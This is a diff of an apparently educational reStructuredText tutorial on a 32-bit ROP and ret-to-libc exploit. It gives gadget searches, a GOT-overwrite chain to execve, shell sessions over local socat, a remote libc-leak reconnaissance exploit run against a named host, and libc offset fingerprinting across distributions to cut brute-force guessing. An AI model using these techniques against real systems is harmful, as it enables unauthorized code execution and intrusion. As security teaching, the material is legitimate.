-      0x80485e7L: pop edi ; pop ebp ;;
-
-      ROPeMe> search leave
-      Searching for ROP gadget:  leave with constraints: []
-      0x804836aL: leave ;;
-      0x8048491L: leave ;;
-      0x804851eL: leave ;;
-
-      ROPeMe> search pop ebp
-      Searching for ROP gadget:  pop ebp with constraints: []
-      0x8048463L: pop ebp ;;
-      0x80485e8L: pop ebp ;;
-      0x80485f3L: pop ebp ;;
+This involved setting up ebx so that after doing unsigned 32-bit address additions we get [ebx+0x5d5b04c4] = 0x0804a008 (``puts``'s GOT address). This gadget ``pop ebx ; pop ebp`` sets ebx:
 
 
-   stage-1 presents more of a gadget selection challenge. We leave it up to the reader to find the easier gadgets. Here we explain the contortions we went through to update the GOT starting at the end of the GOT computations then deducing the preceding gadgets required. After a bit of search and contemplation, updating the GOT table would be done with the gadget
-  
-   .. code-block:: console
+.. code-block:: console
 
-      0x804845eL: add [ebx+0x5d5b04c4] eax ;;
-    
-   This involved setting up ebx so that after doing unsigned 32-bit address additions we get [ebx+0x5d5b04c4] = 0x0804a008 (``puts``'s GOT address). This gadget ``pop ebx ; pop ebp`` sets ebx:
-  
+   0x8048462L: pop ebx ; pop ebp ;;
 
-   .. code-block:: console
-
-      0x8048462L: pop ebx ; pop ebp ;;
-
-   Setting eax to 0x56cc0 = offset(``execve``) - offset(``puts``) proved a bit more challenging as that value has whitespace (NULL) characters which would terminate ``scanf`` input leaving the rest of stage-1 unread. So after noticing the instruction
-  
-
-   .. code-block:: console
-
-      0x8048459L: add eax 0x804a024 ; add [ebx+0x5d5b04c4] eax ;;
-  
-   we did the following:
-  
-     (1) first set eax = offset - 0x0804a024 - 0x0804a024 - 0x0804a024. Now eax does not have any whitespace;
-    
-     (2) then we would run the above gadget 3 times to get eax back to offset.
-  
-   However, that gadget also had a side effect of adding eax to the address [ebx+0x5d5b04c4]. Rather than spraying bits "somewhere", we set ebx = stage1addr - 0x5d5b04c4. Then [ebx+0x5d5b04c4] = stage1addr, which is the (unused) first word of stage-1.
-
-   Finally, the only gadget to ``pop eax`` has a ``leave`` instruction: 
+Setting eax to 0x56cc0 = offset(``execve``) - offset(``puts``) proved a bit more challenging as that value has whitespace (NULL) characters which would terminate ``scanf`` input leaving the rest of stage-1 unread. So after noticing the instruction
 
 
-   .. code-block:: console
+.. code-block:: console
 
-      0x8048368L: pop eax ; pop ebx ; leave ;;
-     
-   The ``leave`` instruction means we have to set ebp to keep executing in our stage-1 buffer.
+   0x8048459L: add eax 0x804a024 ; add [ebx+0x5d5b04c4] eax ;;
+
+we did the following:
+
+  (1) first set eax = offset - 0x0804a024 - 0x0804a024 - 0x0804a024. Now eax does not have any whitespace;
+
+  (2) then we would run the above gadget 3 times to get eax back to offset.
+
+However, that gadget also had a side effect of adding eax to the address [ebx+0x5d5b04c4]. Rather than spraying bits "somewhere", we set ebx = stage1addr - 0x5d5b04c4. Then [ebx+0x5d5b04c4] = stage1addr, which is the (unused) first word of stage-1.
+
+Finally, the only gadget to ``pop eax`` has a ``leave`` instruction: 
+
+
+.. code-block:: console
+
+   0x8048368L: pop eax ; pop ebx ; leave ;;
+
+The ``leave`` instruction means we have to set ebp to keep executing in our stage-1 buffer.
 
 
 Payload
--------
+=======
 
 
+Generating the payload
+----------------------
 
-#. Here is the actual exploit, which must vary between local :program:`libc`'s due to the offsets changing in :program:`libc` between different versions. It overcomes NX, ASLR and ASCII-Armor mapping. The technique uses ROP, ret-to-libc to bypass NX, and resolves :program:`libc` address at runtime to bypass ASLR.
+Here is the actual exploit, which must vary between local :program:`libc`'s due to the offsets changing in :program:`libc` between different versions. It overcomes NX, ASLR and ASCII-Armor mapping. The technique uses ROP, ret-to-libc to bypass NX, and resolves :program:`libc` address at runtime to bypass ASLR.
   
-   The stage-0 loader transfers the actual stage-1 payload to the custom stack using ``scanf`` and ROP gadgets. The stage-0 loader is constructed to reuse data bytes in the vulnerable program to generate the payload. At the end of stage-0 we switch the stack frame to our custom stack in the .data segment and execute the actual stage-1 payload from there. The actual payload (stage-1) executes ROP gadgets to set up the final ``execve`` call.
+The stage-0 loader transfers the actual stage-1 payload to the custom stack using ``scanf`` and ROP gadgets. The stage-0 loader is constructed to reuse data bytes in the vulnerable program to generate the payload. At the end of stage-0 we switch the stack frame to our custom stack in the .data segment and execute the actual stage-1 payload from there. The actual payload (stage-1) executes ROP gadgets to set up the final ``execve`` call.
 
-   This is the python program that creates the exploit code, it's one input being ``offset(execve) - offset(puts)`` computed by the ``libc-offset.sh`` script provided in the previous section. Download :download:`create-payload.py <rop_example/create-payload.py>` and make it executable (``chmod +x create-payload.py``):
-
-
-   .. literalinclude:: rop_example/create-payload.py
-      :language: python
+This is the python program that creates the exploit code, it's one input being ``offset(execve) - offset(puts)`` computed by the ``libc-offset.sh`` script provided in the previous section. Download :download:`create-payload.py <rop_example/create-payload.py>` and make it executable (``chmod +x create-payload.py``):
 
 
-#. Here is the first of 2 examples of running the exploit on your local host. First you can save the python program's output to a file, then ``cat FILE - | ./prog`` to run the exploit. We show here 3 code blocks to be cut-&-pasted into a terminal window. The first kicks off the exploit which moves from a terminal with a prompt to a prompt-less subshell:
+.. literalinclude:: rop_example/create-payload.py
+   :language: python
+
+
+Running the exploit locally
+---------------------------
+
+Here is the first of 2 examples of running the exploit on your local host. First you can save the python program's output to a file, then ``cat FILE - | ./prog`` to run the exploit. We show here 3 code blocks to be cut-&-pasted into a terminal window. The first kicks off the exploit which moves from a terminal with a prompt to a prompt-less subshell:
    
-   .. code-block:: bash
+.. code-block:: bash
 
-      # Create the input file using scripts provided
-      ./create-payload.py $(./libc-offset.sh ./prog execve puts) > input
+   # Create the input file using scripts provided
+   ./create-payload.py $(./libc-offset.sh ./prog execve puts) > input
 
-      # Show PPID and processes before execve
-      echo $PPID
-      ps -ef | grep bash
+   # Show PPID and processes before execve
+   echo $PPID
+   ps -ef | grep bash
 
-      # Run the exploit and now no prompt -
-      #  .bashrc not run in subshell
-      # Also note now in a different process
-      cat input - | ./prog
+   # Run the exploit and now no prompt -
+   #  .bashrc not run in subshell
+   # Also note now in a different process
+   cat input - | ./prog
 
-   Running the above gets this:
+Running the above gets this:
 
-   .. code-block:: text
-      :emphasize-lines: 2,5-6,7,16
+.. code-block:: text
+   :emphasize-lines: 2,5-6,7,16
 
-      (rop) hacker@kali:~$ # Create the input file using scripts provided
-      (rop) hacker@kali:~$ ./create-payload.py $(./libc-offset.sh ./prog execve puts) > input
-      (rop) hacker@kali:~$ 
-      (rop) hacker@kali:~$ # Show PPID and processes before execve
-      (rop) hacker@kali:~$ echo $PPID
-      3345
-      (rop) hacker@kali:~$ ps -ef | grep bash
-      hacker    3352  3345  0 17:43 pts/0    00:00:00 -bash
-      hacker    3442  3345  0 17:43 pts/1    00:00:00 -bash
-      hacker    7317  3345  0 22:17 pts/2    00:00:00 -bash
-      hacker    7933  3352  0 22:48 pts/0    00:00:00 grep bash
-      (rop) hacker@kali:~$ 
-      (rop) hacker@kali:~$ # Run the exploit and now no prompt -
-      (rop) hacker@kali:~$ #  .bashrc not run in subshell
-      (rop) hacker@kali:~$ # Also note now in a different process
-      (rop) hacker@kali:~$ cat input - | ./prog
-      Select from the menu?
-      1. Choice one?
-      2. More choices?
-      3. Something else to choose??
-      > 
-      Almost there ... expand your horizons.
-      > Not enough ... you must really try more before your success.
-
-
-   At this point we're in a prompt-less subshell. From there we'll demo a new $PPID and show the extra bash shells:
-   
-   .. code-block:: bash
-
-      echo $PPID
-      ps -ef | grep bash
-      whoami
-      pwd
-      exit
-
-   Running the above gets this:
-
-   .. code-block:: console
-      :emphasize-lines: 1-3,9-
-
-      echo $PPID
-      3352
-      ps -ef | grep bash
-      hacker    3352  3345  0 17:43 pts/0    00:00:00 -bash
-      hacker    3442  3345  0 17:43 pts/1    00:00:00 -bash
-      hacker    7317  3345  0 22:17 pts/2    00:00:00 -bash
-      hacker    7935  3352  0 22:48 pts/0    00:00:00 [bash]
-      hacker    7961  7935  0 22:50 pts/0    00:00:00 grep bash
-      whoami
-      hacker
-      pwd
-      /home/hacker
-      exit
-
-   Now show we're back in the original shell. Show that with these commands:
-   
-   .. code-block:: bash
-
-      # All done, execve terminated
-      echo $PPID
-      ps -ef | grep bash
-
-   Running the above gets this:
-
-   .. code-block:: console
-      :emphasize-lines: 2-4
-
-      # All done, execve terminated
-      (rop) hacker@kali:~$ echo $PPID
-      3345
-      (rop) hacker@kali:~$ ps -ef | grep bash
-      hacker    3352  3345  0 17:43 pts/0    00:00:00 -bash
-      hacker    3442  3345  0 17:43 pts/1    00:00:00 -bash
-      hacker    7317  3345  0 22:17 pts/2    00:00:00 -bash
-      hacker    8012  3352  0 22:53 pts/0    00:00:00 grep bash
-      (rop) hacker@kali:~$ 
+   (rop) hacker@kali:~$ # Create the input file using scripts provided
+   (rop) hacker@kali:~$ ./create-payload.py $(./libc-offset.sh ./prog execve puts) > input
+   (rop) hacker@kali:~$ 
+   (rop) hacker@kali:~$ # Show PPID and processes before execve
+   (rop) hacker@kali:~$ echo $PPID
+   3345
+   (rop) hacker@kali:~$ ps -ef | grep bash
+   hacker    3352  3345  0 17:43 pts/0    00:00:00 -bash
+   hacker    3442  3345  0 17:43 pts/1    00:00:00 -bash
+   hacker    7317  3345  0 22:17 pts/2    00:00:00 -bash
+   hacker    7933  3352  0 22:48 pts/0    00:00:00 grep bash
+   (rop) hacker@kali:~$ 
+   (rop) hacker@kali:~$ # Run the exploit and now no prompt -
+   (rop) hacker@kali:~$ #  .bashrc not run in subshell
+   (rop) hacker@kali:~$ # Also note now in a different process
+   (rop) hacker@kali:~$ cat input - | ./prog
+   Select from the menu?
+   1. Choice one?
+   2. More choices?
+   3. Something else to choose??
+   > 
+   Almost there ... expand your horizons.
+   > Not enough ... you must really try more before your success.
 
 
-#. Here is the second of 2 examples of running the exploit on your local host, this time over the network. The target "server" is set up in one terminal window using ``sudo -u nobody socat tcp4-listen:8080,bind=127.0.0.1,reuseaddr,fork exec:./prog``, running ``prog`` on port 8080. The second client terminal window connects to the server via ``cat input - | socat - tcp4:127.0.0.1:8080``. The final exploit on a target server will work similarly to this exploit, the only differences being the IP address used and the different offsets within their libc (more on that later).
+At this point we're in a prompt-less subshell. From there we'll demo a new $PPID and show the extra bash shells:
 
-   We start setting up the server in terminal window 1:
+.. code-block:: bash
 
-   .. code-block:: bash
+   echo $PPID
+   ps -ef | grep bash
+   whoami
+   pwd
+   exit
 
-      # Do this from a different terminal window.
-      # Mimick the target server
-      sudo -u nobody socat tcp4-listen:8080,bind=127.0.0.1,reuseaddr,fork exec:./prog
+Running the above gets this:
 
-   Then we start up the client in terminal window 2:
+.. code-block:: console
+   :emphasize-lines: 1-3,9-
 
-   .. code-block:: bash
+   echo $PPID
+   3352
+   ps -ef | grep bash
+   hacker    3352  3345  0 17:43 pts/0    00:00:00 -bash
+   hacker    3442  3345  0 17:43 pts/1    00:00:00 -bash
+   hacker    7317  3345  0 22:17 pts/2    00:00:00 -bash
+   hacker    7935  3352  0 22:48 pts/0    00:00:00 [bash]
+   hacker    7961  7935  0 22:50 pts/0    00:00:00 grep bash
+   whoami
+   hacker
+   pwd
+   /home/hacker
+   exit
 
-      # Send the expoit data over the network
-      cat input - | socat - tcp4:127.0.0.1:8080
+Now show we're back in the original shell. Show that with these commands:
 
-   That gets us a prompt-less shell on the server from terminal window 2:
-   
-   .. code-block:: console
-      :emphasize-lines: 2
+.. code-block:: bash
 
-      (rop) hacker@kali:~$ # Send the expoit data over the network
-      (rop) hacker@kali:~$ cat input - | socat - tcp4:127.0.0.1:8080
-      Select from the menu?
-      1. Choice one?
-      2. More choices?
-      3. Something else to choose??
-      > 
-      Almost there ... expand your horizons.
-      > Not enough ... you must really try more before your success.
-      > 
+   # All done, execve terminated
+   echo $PPID
+   ps -ef | grep bash
 
-   Now the client can continue executing from terminal window 2:
+Running the above gets this:
 
-   .. code-block:: bash
+.. code-block:: console
+   :emphasize-lines: 2-4
 
-      whoami
-      id
-      exit
+   # All done, execve terminated
+   (rop) hacker@kali:~$ echo $PPID
+   3345
+   (rop) hacker@kali:~$ ps -ef | grep bash
+   hacker    3352  3345  0 17:43 pts/0    00:00:00 -bash
+   hacker    3442  3345  0 17:43 pts/1    00:00:00 -bash
+   hacker    7317  3345  0 22:17 pts/2    00:00:00 -bash
+   hacker    8012  3352  0 22:53 pts/0    00:00:00 grep bash
+   (rop) hacker@kali:~$ 
 
-   Running the above results in closing out the exploit from window 2:
-   
-   .. code-block:: console
-      :emphasize-lines: 1-
- 
-      > whoami
-      nobody
-      id
-      uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
-      exit
 
-   Finally, use :kbd:`control-C` to terminate the server session on terminal 1:
+Serving the exploit over localhost:8080
+---------------------------------------
 
-   .. code-block:: console
+Here is the second of 2 examples of running the exploit on your local host, this time over the network. The target "server" is set up in one terminal window using ``sudo -u nobody socat tcp4-listen:8080,bind=127.0.0.1,reuseaddr,fork exec:./prog``, running ``prog`` on port 8080. The second client terminal window connects to the server via ``cat input - | socat - tcp4:127.0.0.1:8080``. The final exploit on a target server will work similarly to this exploit, the only differences being the IP address used and the different offsets within their libc (more on that later).
 
-      hacker@kali:~$ sudo -u nobody socat tcp4-listen:1984,bind=127.0.0.1,reuseaddr,fork exec:./prog
-      ^C
-      hacker@kali:~$ 
+We start setting up the server in terminal window 1:
+
+.. code-block:: bash
+
+   # Do this from a different terminal window.
+   # Mimick the target server
+   sudo -u nobody socat tcp4-listen:8080,bind=127.0.0.1,reuseaddr,fork exec:./prog
+
+Then we start up the client in terminal window 2:
+
+.. code-block:: bash
+
+   # Send the expoit data over the network
+   cat input - | socat - tcp4:127.0.0.1:8080
+
+That gets us a prompt-less shell on the server from terminal window 2:
+
+.. code-block:: console
+   :emphasize-lines: 2
+
+   (rop) hacker@kali:~$ # Send the expoit data over the network
+   (rop) hacker@kali:~$ cat input - | socat - tcp4:127.0.0.1:8080
+   Select from the menu?
+   1. Choice one?
+   2. More choices?
+   3. Something else to choose??
+   > 
+   Almost there ... expand your horizons.
+   > Not enough ... you must really try more before your success.
+   > 
+
+Now the client can continue executing from terminal window 2:
+
+.. code-block:: bash
+
+   whoami
+   id
+   exit
+
+Running the above results in closing out the exploit from window 2:
+
+.. code-block:: console
+   :emphasize-lines: 1-
+
+   > whoami
+   nobody
+   id
+   uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+   exit
+
+Finally, use :kbd:`control-C` to terminate the server session on terminal 1:
+
+.. code-block:: console
+
+   hacker@kali:~$ sudo -u nobody socat tcp4-listen:1984,bind=127.0.0.1,reuseaddr,fork exec:./prog
+   ^C
+   hacker@kali:~$ 
 
 
 libc offsets
-------------
+============
 
+
+Which libc?
+-----------
 
 What has been shown? When we know the libc offsets we can generate an exploit and get a shell. While they are known for a localhost, knowing them for a remote server is another thing.
 
@@ -673,7 +704,7 @@ libc offsets can change with every patch and differ even more between Linux dist
 
 
 Setting up the vulnerable host in GCE
-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+-------------------------------------
 
 To understand how to attack the vulnerable app, first set up the server on a cloud VM. In this case we'll do it using Google Compute Engine and Debian 9.
 
@@ -739,7 +770,7 @@ Of course the vulnerable server is not accessible to determine the offset 0x51dd
 
 
 First try to determine the OS/version
-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+-------------------------------------
 
 If you know the OS and version you can get an estimate of the offset. There are a number of ways a pentester might proceed.
 
@@ -754,52 +785,64 @@ This reveals that the IP is owned by Google, so we could guess that it hosted so
 
 
 Do a reconnaissance exploit
-^^^^^^^^^^^^^^^^^^^^^^^^^^^
+---------------------------
 
 Another approach is to change the exploit payload to instead print out some information about the server, in this case the puts offset in libc.
 
-#. We write a second reconnaisance exploit: instead of doing the buffer overflow exploit we can use ``printf`` to output the actual addresses of ``puts`` and ``__libc_start_main`` on the vulnerable server. Given those addresses we can compare them to other :program:`libc`'s corresponding values to see which one is most like the vulnerable server's :program:`libc`. Here is the reconnaisance exploit coded completely in python. (The main exploit only used python to create the input file, which was ``cat``-ed via a pipe to ``socat``. Here, no ``cat`` is needed.)
 
-   Download :download:`libc-recon.py <rop_example/libc-recon.py>` and make it executable (``chmod +x libc-recon.py``):
+From bash shell exploit to printf reconnaissance
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-   .. literalinclude:: rop_example/libc-recon.py
-      :language: python
+We write a reconnaisance exploit: instead of doing the buffer overflow exploit we can use ``printf`` to output the actual addresses of ``puts`` and ``__libc_start_main`` on the vulnerable server. Given those addresses we can compare them to other :program:`libc`'s corresponding values to see which one is most like the vulnerable server's :program:`libc`. Here is the reconnaisance exploit coded completely in python. (The main exploit only used python to create the input file, which was ``cat``-ed via a pipe to ``socat``. Here, no ``cat`` is needed.)
 
-   A word of warning about this reconnaissance: the application segfaults and a simple ``sudo dmesg | tail`` shows the segfault. Anybody doing log analysis will pick up the fact that *something* is going wrong.
+Download :download:`libc-recon.py <rop_example/libc-recon.py>` and make it executable (``chmod +x libc-recon.py``):
 
-   We first run the exploit locally, getting the correct offset for ``puts`` in :program:`libc`. First, in a separate terminal start up our local "server":
+.. literalinclude:: rop_example/libc-recon.py
+   :language: python
 
-   .. code-block:: console
-
-      hacker@kali:~$ socat tcp4-listen:8080,bind=127.0.0.1,reuseaddr,fork exec:./prog
-
-   and then in a separate window run ``libc-recon.py '127.0.0.1'``:
-
-   .. code-block:: console
-      :emphasize-lines: 1,4
-
-      hacker@kali:~$ ./libc-recon.py '127.0.0.1' 8080
-      puts = 0xf7d71160
-      libc = 0xf7d226a0
-      puts offset = 0x4eac0
+A word of warning about this reconnaissance: the application segfaults and a simple ``sudo dmesg | tail`` shows the segfault. Anybody doing log analysis will pick up the fact that *something* is going wrong.
 
 
-   Remember to go and kill the local "server". This offset 0x4eac0 is exactly that produced by ``./libc-offset.sh ./prog puts __libc_start_main``:
+Testing the reconnaissance locally
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-   .. code-block:: console
+We first run the exploit locally, getting the correct offset for ``puts`` in :program:`libc`. First, in a separate terminal start up our local "server":
 
-      hacker@kali:~$ ./libc-offset.sh ./prog puts __libc_start_main
-      0x4eac0
+.. code-block:: console
 
-   Next we run it against the vulnerable server to get ``puts``'s offset in :program:`libc`.
+   hacker@kali:~$ socat tcp4-listen:8080,bind=127.0.0.1,reuseaddr,fork exec:./prog
 
-   .. code-block:: console
-      :emphasize-lines: 1,4
+and then in a separate window run ``libc-recon.py '127.0.0.1'``:
 
-      hacker@kali:~$ ./libc-recon.py meetup.bitbender.org 8080
-      puts = 0xf757d880
-      libc = 0xf7536180
-      puts offset = 0x47700
+.. code-block:: console
+   :emphasize-lines: 1,4
+
+   hacker@kali:~$ ./libc-recon.py '127.0.0.1' 8080
+   puts = 0xf7d71160
+   libc = 0xf7d226a0
+   puts offset = 0x4eac0
+
+
+Remember to go and kill the local "server". This offset 0x4eac0 is exactly that produced by ``./libc-offset.sh ./prog puts __libc_start_main``:
+
+.. code-block:: console
+
+   hacker@kali:~$ ./libc-offset.sh ./prog puts __libc_start_main
+   0x4eac0
+
+
+Vulnerable server reconnaissance
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Next we run it against the vulnerable server to get ``puts``'s offset in :program:`libc`.
+
+.. code-block:: console
+   :emphasize-lines: 1,4
+
+   hacker@kali:~$ ./libc-recon.py meetup.bitbender.org 8080
+   puts = 0xf757d880
+   libc = 0xf7536180
+   puts offset = 0x47700
 
 This shows the puts offset is 0x47700 in GCE and locally 0x4eac0, or a ratio of 0.908. We could use this to predict the offset of execve from puts: 0.908 * 0x56cc0 = 0x4ed00 (rounded from 0x4ecfc) vs the actual 0x51dd0. Since libc routine addresses are a multiple of 16 (last 4 bits are 0), then the guess if off by (0x51dd0 - 0x4ed00)/16 = 781, or 781 steps away from the initial guess. If you started at 0x4ed00 and made steps of 16 above & below the starting value, you would find the offset after 781 * 2 + 1 = 1563 steps. So we would have to run a little under 1600 brute force guesses before success.
 
@@ -807,183 +850,198 @@ We could improve our initial guess by doing reconnaissance of all the libc value
 
 
 Major libc stats
-^^^^^^^^^^^^^^^^
+----------------
+
+
+A script to analyze libc's
+^^^^^^^^^^^^^^^^^^^^^^^^^^
 
 Another approach is to look at the major libc's (CentOS, Debian, Ubuntu, ...) and compare their numbers to those observed from the reconnaisance results above.
 
-#. First download :download:`libc-offset-so.sh <rop_example/libc-offset-so.sh>` and make it executable (``chmod +x libc-offset-so.sh``):
+First download :download:`libc-offset-so.sh <rop_example/libc-offset-so.sh>` and make it executable (``chmod +x libc-offset-so.sh``):
 
-   .. literalinclude:: rop_example/libc-offset-so.sh
-      :language: bash
-
-
-#. First use :program:`libc-offset-so.sh` to analyze the Debian 9 :program:`libc` `Package: libc6 (2.24-11+deb9u1) <https://packages.debian.org/stable/libs/libc6>`_.  (Note: .deb and .udeb package files can be extracted using ``ar p DEBFILE data.tar.xz | tar -Jx``.):
-
-   .. code-block:: bash
-
-      mkdir libc_debian9
-      cd libc_debian9
-      curl -s -O \
-          http.us.debian.org/debian/pool/main/g/glibc/libc6-udeb_2.24-11+deb9u1_i386.udeb
-      ar p libc*.udeb data.tar.xz | tar -Jx
-      cd ..
-      ./libc-offset-so.sh "$(find libc_debian9 -name 'libc-*so')" \
-          execve puts
-
-   Running the above gets us:
-
-   .. code-block:: console
-      :emphasize-lines: 7-8,11-
-
-      hacker@kali:~$ mkdir libc_debian9
-      hacker@kali:~$ cd libc_debian9
-      hacker@kali:~/libc_debian9$ curl -s -O \
-      >    http.us.debian.org/debian/pool/main/g/glibc/libc6-udeb_2.24-11+deb9u1_i386.udeb
-      hacker@kali:~/libc_debian9$ ar p libc*.udeb data.tar.xz | tar -Jx
-      hacker@kali:~/libc_debian9$ cd ..
-      hacker@kali:~$ ./libc-offset-so.sh "$(find libc_debian9 -name 'libc-*so')" \
-      >     execve puts
-      execve = 0xb16d0
-      puts = 0x5f870
-      offset execve - puts = 0x51e60
-      offset puts - libc = 0x476f0
+.. literalinclude:: rop_example/libc-offset-so.sh
+   :language: bash
 
 
-#. Next analyze the Ubuntu 16.04 LTS :program:`libc` offset.
+Debian 9 libc
+^^^^^^^^^^^^^
 
-   .. code-block:: bash
+First use :program:`libc-offset-so.sh` to analyze the Debian 9 :program:`libc` `Package: libc6 (2.24-11+deb9u1) <https://packages.debian.org/stable/libs/libc6>`_.  (Note: .deb and .udeb package files can be extracted using ``ar p DEBFILE data.tar.xz | tar -Jx``.):
 
-      mkdir libc_ubuntu_16.04
-      cd libc_ubuntu_16.04
-      curl -s -O \
-          http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6-i386_2.23-0ubuntu10_amd64.deb
-      ar p libc*.deb data.tar.xz | tar -Jx
-      cd ..
-      ./libc-offset-so.sh "$(find libc_ubuntu_16.04 -name 'libc-*so')" \
-          execve puts
+.. code-block:: bash
 
-   Running this results in:
+   mkdir libc_debian9
+   cd libc_debian9
+   curl -s -O \
+       http.us.debian.org/debian/pool/main/g/glibc/libc6-udeb_2.24-11+deb9u1_i386.udeb
+   ar p libc*.udeb data.tar.xz | tar -Jx
+   cd ..
+   ./libc-offset-so.sh "$(find libc_debian9 -name 'libc-*so')" \
+       execve puts
 
-   .. code-block:: console
-      :emphasize-lines: 7-8,11-
+Running the above gets us:
 
-      hacker@kali:~$ mkdir libc_ubuntu_16.04
-      hacker@kali:~$ cd libc_ubuntu_16.04
-      hacker@kali:~/libc_ubuntu_16.04$ curl -s -O \
-      >    http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6-i386_2.23-0ubuntu10_amd64.deb
-      hacker@kali:~/libc_ubuntu_16.04$ ar p libc*.deb data.tar.xz | tar -Jx
-      hacker@kali:~/libc_ubuntu_16.04$ cd ..
-      hacker@kali:~$ ./libc-offset-so.sh "$(find libc_ubuntu_16.04 -name 'libc-*so')" \
-      >     execve puts
-      execve = 0xaf590
-      puts = 0x5f140
-      offset execve - puts = 0x50450
-      offset puts - libc = 0x46c00
+.. code-block:: console
+   :emphasize-lines: 7-8,11-
 
-
-#. For the Centos 7 i386 :program:`libc`:
-
-   .. code-block:: bash
-
-      # rpm needs rpm2cpio to unpack
-      sudo apt install rpm2cpio -y
-
-      # get offsets for centos7 libc
-      mkdir libc_centos7
-      cd libc_centos7
-      curl -s -O \
-          http://mirrors.usc.edu/pub/linux/distributions/centos/7/updates/x86_64/Packages/glibc-2.17-196.el7_4.2.x86_64.rpm
-      rpm2cpio glibc-*.rpm | cpio --quiet -idm
-      cd ..
-      ./libc-offset-so.sh "$(find libc_centos7 -name 'libc-*so')" execve puts
-
-   Running the above gets us:
-
-   .. code-block:: console
-      :emphasize-lines: 16,19-
-
-      hacker@kali:~$ # rpm needs rpm2cpio to unpack
-      hacker@kali:~$ sudo apt install rpm2cpio -y
-      Reading package lists... Done
-      Building dependency tree       
-      Reading state information... Done
-      rpm2cpio is already the newest version.
-      0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
-      hacker@kali:~$ 
-      hacker@kali:~$ # get offsets for centos7 libc
-      hacker@kali:~$ mkdir libc_centos7
-      hacker@kali:~$ cd libc_centos7
-      hacker@kali:~/libc_centos7$ curl -s -O \
-      >     http://mirrors.usc.edu/pub/linux/distributions/centos/7/updates/x86_64/Packages/glibc-2.17-196.el7_4.2.x86_64.rpm
-      hacker@kali:~/libc_centos7$ rpm2cpio glibc-*.rpm | cpio --quiet -idm
-      hacker@kali:~/libc_centos7$ cd ..
-      hacker@kali:~$ ./libc-offset-so.sh "$(find libc_centos7 -name 'libc-*so')" execve puts
-      execve = 0xbf550
-      puts = 0x6cf20
-      offset execve - puts = 0x52630
-      offset puts - libc = 0x4b410
+   hacker@kali:~$ mkdir libc_debian9
+   hacker@kali:~$ cd libc_debian9
+   hacker@kali:~/libc_debian9$ curl -s -O \
+   >    http.us.debian.org/debian/pool/main/g/glibc/libc6-udeb_2.24-11+deb9u1_i386.udeb
+   hacker@kali:~/libc_debian9$ ar p libc*.udeb data.tar.xz | tar -Jx
+   hacker@kali:~/libc_debian9$ cd ..
+   hacker@kali:~$ ./libc-offset-so.sh "$(find libc_debian9 -name 'libc-*so')" \
+   >     execve puts
+   execve = 0xb16d0
+   puts = 0x5f870
+   offset execve - puts = 0x51e60
+   offset puts - libc = 0x476f0
 
 
+Ubuntu 16.04 LTS libc
+^^^^^^^^^^^^^^^^^^^^^
 
-#. We see the :program:`libc`'s ``execve / puts`` offset ratio is around 1.09 or 1.14 (depending on the distribution):
+Next analyze the Ubuntu 16.04 LTS :program:`libc` offset.
+
+.. code-block:: bash
+
+   mkdir libc_ubuntu_16.04
+   cd libc_ubuntu_16.04
+   curl -s -O \
+       http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6-i386_2.23-0ubuntu10_amd64.deb
+   ar p libc*.deb data.tar.xz | tar -Jx
+   cd ..
+   ./libc-offset-so.sh "$(find libc_ubuntu_16.04 -name 'libc-*so')" \
+       execve puts
+
+Running this results in:
+
+.. code-block:: console
+   :emphasize-lines: 7-8,11-
+
+   hacker@kali:~$ mkdir libc_ubuntu_16.04
+   hacker@kali:~$ cd libc_ubuntu_16.04
+   hacker@kali:~/libc_ubuntu_16.04$ curl -s -O \
+   >    http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6-i386_2.23-0ubuntu10_amd64.deb
+   hacker@kali:~/libc_ubuntu_16.04$ ar p libc*.deb data.tar.xz | tar -Jx
+   hacker@kali:~/libc_ubuntu_16.04$ cd ..
+   hacker@kali:~$ ./libc-offset-so.sh "$(find libc_ubuntu_16.04 -name 'libc-*so')" \
+   >     execve puts
+   execve = 0xaf590
+   puts = 0x5f140
+   offset execve - puts = 0x50450
+   offset puts - libc = 0x46c00
 
 
-   .. csv-table:: libc execve offset ratios
-      :header: "libc distribution", "puts - libc start", "execve - puts", "ratio"
-      :stub-columns: 1
-      :widths: 2,1,1,1
+Centos 7 libc
+^^^^^^^^^^^^^
 
-      "Debian 9", "0x000476f0", "0x00051e60", "1.15"
-      "Ubuntu 16.04 LTS", "0x00046c00", "0x00050450", "1.13"
-      "CentOS 7", "0x0004b410", "0x00052630", "1.09"
-      "vuln server", "0x00047700", "0x0004dde0 ?", "1.09 ?"
-      "vuln server", "0x00047700", "0x00051700 ?", "1.14 ?"
+For the Centos 7 i386 :program:`libc`:
 
-   So we pull a guess of 0x51700 assuming Ubuntu/Debian server. The guess from the reconnaissance program was 0x4ed00. Given the actual answer is 0x51dd0, this guess is far better. It's low by 109 guesses, meaning a search centered around the guess would take 219 guesses before success - a huge reduction in the search space.
+.. code-block:: bash
+
+   # rpm needs rpm2cpio to unpack
+   sudo apt install rpm2cpio -y
+
+   # get offsets for centos7 libc
+   mkdir libc_centos7
+   cd libc_centos7
+   curl -s -O \
+       http://mirrors.usc.edu/pub/linux/distributions/centos/7/updates/x86_64/Packages/glibc-2.17-196.el7_4.2.x86_64.rpm
+   rpm2cpio glibc-*.rpm | cpio --quiet -idm
+   cd ..
+   ./libc-offset-so.sh "$(find libc_centos7 -name 'libc-*so')" execve puts
+
+Running the above gets us:
+
+.. code-block:: console
+   :emphasize-lines: 16,19-
+
+   hacker@kali:~$ # rpm needs rpm2cpio to unpack
+   hacker@kali:~$ sudo apt install rpm2cpio -y
+   Reading package lists... Done
+   Building dependency tree       
+   Reading state information... Done
+   rpm2cpio is already the newest version.
+   0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+   hacker@kali:~$ 
+   hacker@kali:~$ # get offsets for centos7 libc
+   hacker@kali:~$ mkdir libc_centos7
+   hacker@kali:~$ cd libc_centos7
